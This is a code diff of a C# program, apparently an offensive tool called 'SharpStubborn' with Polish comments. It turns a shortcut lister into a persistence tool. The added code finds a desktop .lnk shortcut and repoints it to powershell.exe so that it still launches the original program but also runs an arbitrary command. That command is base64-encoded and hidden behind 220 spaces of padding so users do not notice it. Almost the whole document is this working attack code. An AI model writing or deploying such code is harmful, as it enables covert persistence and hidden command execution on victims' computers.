@@ -1,73 +1,72 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Runtime.CompilerServices;
-using System.Runtime.InteropServices;
-using System.Runtime.Remoting.Messaging;
 using System.Text;
-using System.Threading.Tasks;
+using IWshRuntimeLibrary;
 
-namespace SharpStubborn
+namespace DesktopShortcutsLister
 {
-    public class Shortcut
-    {
-        public string Name { get; set; }
-        public string TargetPath { get; set; }
-        public string IconLocation {  get; set; }
-        public string WorkingDirectory {  get; set; }
-        public string Arguments { get; set; }
-
-    }
-    internal class Program
+    class Program
     {
         static void Main(string[] args)
         {
-            // Create list of shortcuts
-            List<Shortcut> shortcuts = new List<Shortcut>();
-            getShortcuts();
-
-            foreach (Shortcut shortcut in shortcuts) {
-                Console.WriteLine("Nazwa to " + shortcut.Name);
-                Console.WriteLine("Target path to " + shortcut.TargetPath);
-                Console.WriteLine("Icon location to " + shortcut.IconLocation);
-            }
-
-
-
-            void getShortcuts()
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+            string[] shortcutFiles = Directory.GetFiles(desktopPath, "*.lnk");
+            
+            // Check if two arguments
+            if (args.Length < 2)
             {
-                // Pobranie sciezki do pulpitu
-                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-                string[] shortcuts_path = Directory.GetFiles(desktopPath, "*.lnk");
+                Console.WriteLine("Usage: SharpStubborn <lnk name> <Komenda do wykonania>");
+                return;
+            }
+            string searchQuery = args[0];
+            string cmd = args[1];
 
-                if (shortcuts_path.Length == 0)
+            // Znajdź pierwszy skrót, którego nazwa zawiera frazę, ignorując wielkość liter
+            string foundShortcutPath = null;
+            foreach (var filePath in shortcutFiles)
+            {
+                string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
+                if (fileNameWithoutExtension.IndexOf(searchQuery, StringComparison.OrdinalIgnoreCase) >= 0)
                 {
-                    Console.WriteLine("Nie znaleziono zadnych skrótów");
+                    foundShortcutPath = filePath;
+                    break;
                 }
-                else
-                {
-                    Console.WriteLine("Znaleziono nastepujace skróty");
-                    foreach (string shortcut_path in shortcuts_path)
-                    {
-                        Console.WriteLine(shortcut_path);
-                        IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
-                        IWshRuntimeLibrary.IWshShortcut link = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcut_path);
-                        Shortcut shortcut = new Shortcut
-                        {
-                            Name = shortcut_path,
-                            TargetPath = link.TargetPath,
-                            IconLocation = link.IconLocation,
-                            WorkingDirectory = link.WorkingDirectory,
-                            Arguments = link.Arguments
-                        };
-                        shortcuts.Add(shortcut);
-                    }
-                } 
             }
 
-                // test
-        }
+            if (foundShortcutPath != null)
+            {
+                // Załaduj skrót, aby go zmodyfikować
+                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
+                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(foundShortcutPath);
 
+                Console.WriteLine("Znaleziono skrót:");
+                Console.WriteLine($"Nazwa: {Path.GetFileNameWithoutExtension(foundShortcutPath)}");
+                Console.WriteLine($"Ścieżka docelowa: {shortcut.TargetPath}");
+
+
+                string newCmd = "start-process " + shortcut.TargetPath + " " + shortcut.Arguments.ToString() + ";" + cmd;
+
+                byte[] newcmdBytes = Encoding.Unicode.GetBytes(newCmd);
+                string encodednewCmd = Convert.ToBase64String(newcmdBytes);
+                string newaArgument = "-e ".PadLeft(220) + encodednewCmd;
+        
+
+                //newTargetPath = @"C:\Windows\System32\cmd.exe";
+                // Zmodyfikuj TargetPath
+                shortcut.TargetPath = "powershell.exe";
+
+                shortcut.Arguments = newaArgument;
+   
+                // Zapisz zmieniony skrót
+                shortcut.Save();
+
+                Console.WriteLine("Ścieżka docelowa została zaktualizowana.");
+            }
+            else
+            {
+                Console.WriteLine("Nie znaleziono skrótu pasującego do zapytania.");
+            }
+        }
     }
 }
